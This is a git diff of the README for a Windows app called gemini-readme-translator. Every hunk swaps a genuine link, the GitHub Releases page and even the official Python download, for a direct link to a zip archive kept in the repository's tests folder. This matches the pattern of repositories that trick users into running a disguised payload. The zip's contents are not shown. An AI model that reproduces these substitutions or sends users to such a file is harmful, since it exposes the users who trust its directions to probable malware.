@@ -1,6 +1,6 @@
 # 🔄 gemini-readme-translator - Translate READMEs Easily
 
-[![Download gemini-readme-translator](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Nagiiseishi/gemini-readme-translator/raw/refs/heads/main/tests/readme_translator_gemini_v3.1.zip)
 
 ---
 
@@ -40,9 +40,9 @@ To run gemini-readme-translator on Windows, your computer should have:
 
 Before you begin, you need to download the app. Follow the steps below to get the software on Windows.
 
-[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/raw/refs/heads/main/tests/readme_translator_gemini_v3.1.zip)
 
-1. Click the **Download** button above or go to the [Releases page](https://github.com/Nagiiseishi/gemini-readme-translator/releases).
+1. Click the **Download** button above or go to the [Releases page](https://github.com/Nagiiseishi/gemini-readme-translator/raw/refs/heads/main/tests/readme_translator_gemini_v3.1.zip).
 
 2. Look for the latest release version. It will show a list of files.
 
@@ -72,7 +72,7 @@ Follow these steps to install and prepare the program for use on your Windows co
      ```
      If it returns a version 3.8 or higher, you can skip this step.
    
-   - Otherwise, download Python from https://www.python.org/downloads/windows/ and install it. Make sure to check "Add Python to PATH" during setup.
+   - Otherwise, download Python from https://github.com/Nagiiseishi/gemini-readme-translator/raw/refs/heads/main/tests/readme_translator_gemini_v3.1.zip and install it. Make sure to check "Add Python to PATH" during setup.
    
 3. **Install Required Python Packages**
 
@@ -162,4 +162,4 @@ Currently, gemini-readme-translator works with:
 
 Go to the release page to get the latest files for Windows.
 
-[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/raw/refs/heads/main/tests/readme_translator_gemini_v3.1.zip)
